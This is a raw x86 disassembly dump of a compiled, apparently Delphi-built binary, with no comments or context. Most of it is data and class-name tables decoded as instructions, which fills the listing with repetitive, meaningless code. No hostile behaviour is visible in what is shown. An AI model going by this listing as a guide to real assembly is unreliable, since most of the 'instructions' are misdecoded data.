add [ esp + ebx * 2 + 0xc0041 ] al
outsb
inc ebp
jb r-xdata
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
pop ebp
inc ecx
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
dec esi
outsd
je r-xdata
inc eax
add [ eax ] al
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + eax * 2 ] bl
or al 0x0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
outsd
jne r-xdata
xor eax [ eax ]
outsd
jne r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc ecx
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
pop esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 ] ch
add [ eax ] al
inc ebp
jb r-xdata
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
inc esp
pop esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 2 + 0x41 ] al
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
pop esi
inc ecx
lea eax [ eax ]
in al dx
pop ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
nop
nop
pop ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00415d ] dl
add [ eax ] al
add ah cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
pop ebp
inc ecx
add [ eax + eax ] cl
add [ eax ] al
int3
outsd
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
xor eax 0x35ac0040
inc eax
add [ eax + 0x4035 ] ah
pop ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_415dcb
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
inc esp
pop esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 2 + 0x41 ] al
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
outsd
jne r-xdata
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
pop esi
inc ecx
lea eax [ eax ]
in al dx
pop ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
pop ebp
inc ecx
add [ eax + eax ] cl
add [ eax ] al
int3
sub_415e7b
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] dl
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
xor eax [ eax ]
pop eax
xor eax [ eax ]
adc [ ebp + 0x49 ] eax
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5f ] bl
inc ecx
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x35980040 ] dh
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
enter 0x40bc 0x0
pop eax
xor eax [ eax ]
cmovne ecx [ edi + 0x75 ]
je r-xdata
outsd
jb r-xdata
add [ eax - 0x79 ] bh
inc ecx
add ah dh
xchg [ ecx ] eax
add eax 0x73694c54
je r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x6014c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ edi + eax * 4 ] ah
inc ecx
add al cl
mov [ ecx ] al
or [ ebx - 0x7887ffbf ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x60
jne r-xdata
add [ ebx + esi ] bl
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
pushfd
pop esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 2 + 0xc0041 ] bl
add [ eax ] al
int3
inc eax
add ah bh
pop esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
pop esi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
int3
outsb
jbe r-xdata
dec ecx
sar [ eax + 0x60 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x60 ] bh
inc ecx
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
arpl [ ebp + 0x73 ] sp
mov ah 0x5f
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 2 + 0xc0041 ] dh
add [ eax ] al
int3
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x75 ] ah
inc ecx
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ eax + 0x41 ] 0x1
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah dl
mov [ ecx ] es
add eax 0x74694254
jae r-xdata
shl [ ecx ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x61 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
popad
inc ecx
add [ esi ] bh
popad
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x67ffbe72 ] cl
pop [ ecx ]
mov al [ 0xffffffffb400418f ]
mov es [ ecx ]
add al [ eax ]
sub_41660c
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
cwde
outsb
dec ecx
je r-xdata
add [ ebx + esi ] bl
imul ebp [ esi + 0x67 ] 0x7473694c
and [ edi + 0x41 ] ah
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
fwait
inc ecx
add [ eax + 0x6c00419a ] dl
test eax 0xa9a00041
inc ecx
add [ ecx + ebp * 4 - 0x5657ffbf ] ah
inc ecx
add [ esi + ebx * 4 + 0x41 ] bh
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
js r-xdata
add [ ebp + ebp * 4 + 0x41 ] cl
add [ eax - 0x5bffbe4f ] dl
mov cl 0x41
add [ ecx + esi * 4 + 0x41 ] al
popad
add [ eax - 0x4fffbe53 ] bl
lodsd [ esi ]
inc ecx
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ eax - 0x52 ] dl
inc ecx
add ah dl
scasb [ edi ]
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
dec esp
lodsd [ esi ]
inc ecx
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
in al 0x65
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jl r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc ecx
push ebx
je r-xdata
popad
insd
mov eax eax
pushfd
push 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x8004168
add [ eax ] al
add al bl
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ebx + esi * 4 + 0x41 ] ah
add [ ebp + ebp * 4 + 0x41 ] cl
add [ eax - 0x5bffbe4f ] dl
mov cl 0x41
add [ ecx + esi * 4 + 0x41 ] al
add [ ecx + esi * 4 + 0x41 ] dl
add [ eax - 0x52 ] dl
inc ecx
add [ ecx + esi * 4 + 0x41 ] ah
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
add [ ecx + esi * 4 + 0x41 ] dl
add [ eax - 0x52 ] dl
inc ecx
add [ ecx + esi * 4 + 0x41 ] ah
add [ 0x6e614854 ] cl
inc esp
mov cl 0x41
popad
insd
nop
inc ecx
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jb r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc ecx
add [ eax ] dh
add [ eax ] al
add ah bh
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah al
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax - 0x67ffbe71 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi + 0x41 ] ah
add [ ebx + ebp * 4 ] bl
inc ecx
add [ eax - 0x55 ] bh
inc ecx
add [ esp + ebp * 4 + 0x41 ] cl
add [ 0xffffffffac880041 ] bh
inc ecx
add ah bh
lodsb [ esi ]
inc ecx
add [ eax ] ah
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi ] ch
inc ecx
add al bl
cdq
inc ecx
add al cl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] cl
test al 0x41
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax ] ch
sahf
inc ecx
add [ edx + ebp * 4 ] al
inc ecx
add [ eax ] dh
mov al [ 0xffffffffa1040041 ]
inc ecx
add [ eax - 0x56 ] al
inc ecx
add [ eax - 0x56 ] dl
inc ecx
add [ eax - 0x5f ] ch
inc ecx
add [ ecx - 0x5d97ffbf ] bh
inc ecx
add [ eax ] al
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x5c ] bl
inc ecx
add ah ch
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x53ffbe59 ] dl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edx + ebp * 4 - 0x570bffbf ] ah
inc ecx
add [ esp + ebp * 4 - 0x533bffbf ] dh
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
inc ecx
insd
dec ebp
insd
outsd
jb r-xdata
insd
adc [ ecx + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 ] ch
inc ecx
add [ eax ] dl
add [ eax ] al
add [ edi + 0x41 ] al
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebp + ebp * 4 + 0x41 ] cl
add [ eax - 0x4fffbe53 ] bl
lodsd [ esi ]
inc ecx
add [ eax + 0x4c0041b3 ] ah
sub eax [ eax ]
fdiv [ ebx - 0x512bffbf ]
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
aam 0xae
je r-xdata
insb
push ebx
je r-xdata
outsb
jae r-xdata
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
insd
mov eax 0x7004167
pop es
push esp
push ebx
je r-xdata
popad
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebp + ebp * 4 + 0x41 ] cl
add [ ebp + 0x67900040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x40041 ] ch
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
jns r-xdata
push ebx
je r-xdata
push ebx
push ebx
inc ecx
add ah cl
mov ah 0x41
add [ 0x6d654d54 ] cl
inc ecx
add [ ebp + 0x68240040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x68 ] al
inc ecx
add [ eax ] cl
add [ eax ] al
add [ edi + 0x41 ] al
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
dec esp
lodsd [ esi ]
inc ecx
je r-xdata
outsd
jb r-xdata
insd
add ah dl
scasb [ edi ]
popad
insd
mov [ ecx + 0x41 ] gs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x140041 ] ch
add [ eax ] al
les ebp [ eax + 0x41 ]
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah bh
mov bl 0x41
add [ ebp + ebp * 4 + 0x41 ] cl
add [ eax - 0x4fffbe4c ] ah
lodsd [ esi ]
inc ecx
add [ eax + 0x580041b3 ] ah
mov ch 0x41
add al bl
mov bl 0x41
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
add [ eax - 0x4fffbe53 ] bl
lodsd [ esi ]
inc ecx
add [ eax + 0x140041b3 ] ah
mov bh 0x41
add al bl
mov bl 0x41
add ah dl
scasb [ edi ]
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
or [ edx + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 2 ] ah
inc ecx
add [ eax ] bl
add [ eax ] al
add ah al
push 0x35980041
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah bl
mov dh 0x41
add [ ebp + ebp * 4 + 0x41 ] cl
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_416bb1
and [ edx ] al
fsub [ eax ]
inc edx
add ah ah
and [ edx ] al
pushad
and [ edx ] eax
push cs
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
insd
inc ecx
add [ eax + eax ] cl
add [ esp + ebp * 2 ] ch
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x1a ] ch
inc ecx
add [ eax - 0x19 ] cl
inc ecx
add [ eax - 0x37ffbe1a ] ah
out 0x41 al
add [ edi ] al
inc ecx
add ah dh
0xe0041 0x0
add al bl
mov edi 0xe1b40041
inc ecx
add [ ecx - 0x30e7ffbf ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2800416c ] cl
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ edi + esi * 4 + 0x41 ] dh
add [ edi + esi * 4 + 0x2b4c0041 ] bl
inc eax
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ esi ] al
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x416cdc90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp * 2 + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
shr [ ebp + ebp * 2 + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebp + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ ebx + 0x41 ] 0x0
sbb [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
cwde
xor eax 0x5b840040
inc eax
add [ eax - 0x53ffbfa5 ] dl
xor eax 0x35a00040
inc eax
add [ eax + 0x1c00405b ] ah
xor eax [ eax ]
les ebx [ edx + eax * 2 ]
add ah bh
sbb al 0x42
add [ ebp + ebx + 0x42 ] ah
add ah cl
sbb eax 0x1e500042
inc edx
add [ esi + ebx + 0x20b40042 ] dh
inc edx
add al al
and [ edx ] al
int3
sbb al 0x6c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 ] bl
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esp + edi * 2 + 0x41 ] dh
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
insd
inc ecx
add [ eax + eax ] bh
add [ esp + ebp * 2 ] ch
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esi + edi * 4 ] dh
inc ecx
add [ edi + esi * 4 - 0x416bffbf ] bl
inc ecx
add al cl
mov esi 0xc1dc0041
inc ecx
add [ eax - 0x1bffbe41 ] bh
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x6d
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax + 0x6c ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_416d84
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
sub al 0x0
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsb
inc ecx
add [ eax + eax ] bh
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x2fffbfcb ] bl
or eax 0x35a80042
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0xd ] ch
inc edx
add [ esi + ecx + 0x2b4c0042 ] al
inc eax
add [ edi ] al
push esp
push esp
push 0x64616572
push eax
outsb
inc ecx
add [ edi ] al
pop es
push esp
push esp
push 0x64616572
cmp al 0x6e
inc ecx
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
je r-xdata
add [ ebx - 0x27fbdbbc ] al
jmp sub_421974
jae r-xdata
add [ eax ] al
jb r-xdata
add [ ebp + 0x6e740040 ] cl
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebp + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
insd
inc ecx
add [ eax + eax ] cl
add [ esp + ebp * 2 ] ch
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x1a ] ch
inc ecx
add [ eax - 0x19 ] cl
inc ecx
add [ eax - 0x37ffbe1a ] ah
out 0x41 al
add [ edi ] al
inc ecx
add ah dh
0xe0041 0x0
shr al 0x6d
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
insd
inc ecx
add [ eax + eax ] cl
add [ eax ] al
int3
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
mov [ gs : esi + 0x41 ] ch
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
inc esp
and al 0x4
aam 0xe9
imul ebp [ edx - 0x3a340000 ] 0x6e
inc ecx
add bl dl
outsb
inc ecx
add ch bl
outsb
inc ecx
add [ ebp - 0x18ffbe92 ] bh
outsb
inc ecx
add ch dh
outsb
inc ecx
add bh bh
outsb
inc ecx
add [ edx ] al
jns r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
rcr al 0xe9
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e82815
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
pop ebp
retn 0x4
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
iretd
dec [ ebx - 0x3f7c3340 ]
fsubr st1
add bh bh
